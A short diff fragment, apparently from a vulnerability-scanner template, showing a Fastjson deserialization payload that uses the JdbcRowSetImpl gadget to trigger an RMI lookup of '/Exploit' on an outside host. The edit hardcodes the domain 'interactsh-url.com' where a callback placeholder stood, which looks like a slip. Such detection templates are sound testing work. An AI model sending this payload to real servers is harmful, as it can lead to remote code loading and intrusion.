@@ -32,7 +32,7 @@ http:
             },
             "b":{
                 "@type":"com.sun.rowset.JdbcRowSetImpl",
-                "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
+                "dataSourceName":"rmi://interactsh-url.com/Exploit",
                 "autoCommit":true
             }
         }
